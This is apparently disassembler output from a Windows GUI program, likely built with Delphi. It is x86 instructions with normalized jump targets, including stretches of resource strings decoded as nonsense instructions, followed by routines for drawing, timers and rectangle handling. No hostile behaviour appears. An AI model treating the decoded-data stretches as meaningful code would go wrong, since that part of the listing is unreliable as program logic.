add [ eax ] al
and al [ eax ]
or eax 0x6562614c
insb
push eax
outsd
jae r-xdata
add [ eax ] eax
arpl [ ecx + 0x6e ] bp
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
dec [ eax + 0x10042e2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ ebp + 0x61 ] ecx
js r-xdata
or cl [ edi + 0x45 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ ebx ] cl
push eax
popad
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
inc ebp
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] ch
add al [ eax ]
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002c ] al
outsd
jo r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ch
add [ ebx ] cl
push eax
popad
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
outsb
je r-xdata
jb r-xdata
or edx [ eax + 0x61 ]
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
sub [ eax ] eax
or dl [ eax + 0x61 ]
inc esp
add [ eax ] dl
add [ eax ] al
add [ es : esi ] cl
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push [ ebp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
and eax 0xdcdc0043
ja r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
and eax 0x73580043
inc ebx
add [ eax + 0x1004373 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040030 ] al
js r-xdata
inc ebx
fcomp st4
outsb
jne r-xdata
adc [ eax ] al
0xccff0000 0x4374
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
cdq
adc [ eax ] al
push cs
push 0x6948776f
outsb
je r-xdata
sub [ eax ] al
or edx [ eax + 0x61 ]
adc [ eax ] al
test eax 0xb0ff0001
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
test [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
js r-xdata
add [ ebp + ebx * 8 + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
sub eax 0x65520800
popad
dec edi
outsb
insb
jns r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax + eax ] bh
call [ eax ]
jae r-xdata
adc [ eax ] al
or eax 0x3cff0002
jecxz r-xdata
sub eax [ eax ]
add [ eax ] al
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0x64387261
add [ eax ] al
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
xor [ eax + eax ] 0xe
dec edi
inc ebx
add ah dl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
cmovno eax [ eax ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
push esp
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
hlt
[ eax + 0x70004374 ]
add [ ecx ] al
add [ eax ] al
add al [ eax ]
inc esp
jecxz r-xdata
inc eax
add [ esi ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f07003a ] al
push esp
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
sub [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090038 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
push es
dec edi
outsb
inc ebp
js r-xdata
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
sub [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or [ edi + 0x6e ] ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f0a0037 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0a00
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94182b8
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
daa
sub [ eax ] 0x43
add al ah
add [ eax ] eax
jmp eax
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
inc esp
jb r-xdata
dec edi
outsb
push ebx
je r-xdata
pop eax
daa
inc ebx
add al ah
add [ eax ] al
jmp eax
xor al 0x28
inc ebx
add al ch
add [ eax ] eax
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
sub [ ebx ] al
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or [ edi + 0x6e ] ecx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090041 ] al
daa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
in al dx
jb r-xdata
hlt
push ebp
jo r-xdata
arpl [ ebx - 0x5c ] bp
sub [ ebx ] eax
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
[ eax ]
sub [ ebx ] al
[ eax ] al
push eax
add [ eax ] al
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
or [ ebx + 0x458b0c50 ] cl
or [ ebx + 0x408bf840 ] cl
adc al ch
test [ ecx - 0x1 ] 0xff
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
sub eax [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
inc ebx
add al bl
add [ eax ] al
shl [ edi ] 0x1
inc ebp
or [ ebx + 0x2b9f840 ] cl
add [ eax ] al
add al ch
xchg edx eax
dec ecx
nop
inc eax
inc edx
jb r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c724
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
inc esp
outsd
sub_4284ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c724
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c724
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
pop ebx
mov esp ebp
pop ebp
retn
sub_428570
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41c830
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_4284ac
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_4285d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4191e0
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_428658
call sub_41a340
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_428620
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4286cc
mov eax [ esi + 0x34 ]
call sub_41a3f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41922c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_428658
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_428692
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4286cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428752
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
sub_4287a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f7a4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
add esp 0xfffffff0
call sub_403540
mov edx 0xb9
mov eax esi
call sub_436b14
mov edx 0x29
mov eax esi
call sub_436b38
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_428bf4
mov edx 0x1
mov eax esi
call sub_428c10
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_4374f8
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_43ddd4
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_428868
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a9cc
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4288d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43d158
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_43b0e0
sub_428918
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_437358
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_43c01c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a0f
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43db40
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43db40
push eax
call InvalidateRect
sub_428a18
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_428a50
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_428570
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_428a18
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_428570
mov esi [ ebx + 0x208 ]
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
push ebp
call sub_428a18
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_428570
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41ca04
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41cda8
mov eax ebx
call sub_43ed20
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_439638
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x1c ]
call sub_40442c
push eax
mov eax esi
call sub_41d1bc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bb9
lea eax [ ebp - 0x1c ]
call sub_403f6c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cb20
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41d0dc
mov edx r-xdata
mov eax esi
call sub_41d038
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_428c64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439bac
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_428cbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c7d4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c7d4
call sub_403a54
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436b38
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_436b14
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_428df8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43e688
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_428e24
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_43ed28
pop esi
pop ebx
retn
sub_428fc8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_430cc4
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4136e4
xor edx edx
mov eax edi
call sub_437278
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_4374cc
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_4293f8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42904c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413984
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_429084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4290e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_430fc4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_4290ee
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429114
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43cb24
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403430
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
